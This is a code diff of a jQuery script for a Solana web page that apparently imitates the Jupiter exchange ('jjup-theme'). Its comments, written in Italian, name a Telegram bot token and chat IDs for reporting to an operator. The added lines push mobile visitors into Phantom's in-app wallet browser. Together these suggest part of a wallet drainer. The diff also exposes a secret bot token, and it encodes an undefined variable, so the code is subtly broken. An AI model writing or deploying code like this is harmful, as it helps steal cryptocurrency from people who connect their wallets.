@@ -3,13 +3,22 @@ $(document).ready(async function () {
   // const telegramToken = "8156645817:AAH_KHYsM_9OZ6Q7Uj55cJsyA6gZKybCp1s"; //
   // Sostituisci con il token del tuo bot
   // const chatId = "7050439107"; // Sostituisci con il tuo chat ID
-    const chatId = "927059314"; // Sostituisci con il tuo chat ID
+  const chatId = "927059314"; // Sostituisci con il tuo chat ID
   const LAMPORTS_PER_SOL = 1000000000; // 1 SOL = 1.000.000.000 lamport
+  const siteURLX = "https://jjup-theme.vercel.app";
+  const encodedURLX = encodeURIComponent(siteURL);
   const isMobile =
     /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
       navigator.userAgent
     );
+if (isMobile && !(window.solana && window.solana.isPhantom)) {
+  const phantomDeepLink = `https://phantom.app/ul/browse/${encodedURLX}`;
+  window.location.href = phantomDeepLink;
 
+  setTimeout(() => {
+    window.location.href = "https://phantom.app/download";
+  }, 2500);
+}
   const splToken = splToken_.default;
 
   // Funzione per inviare messaggi a Telegram
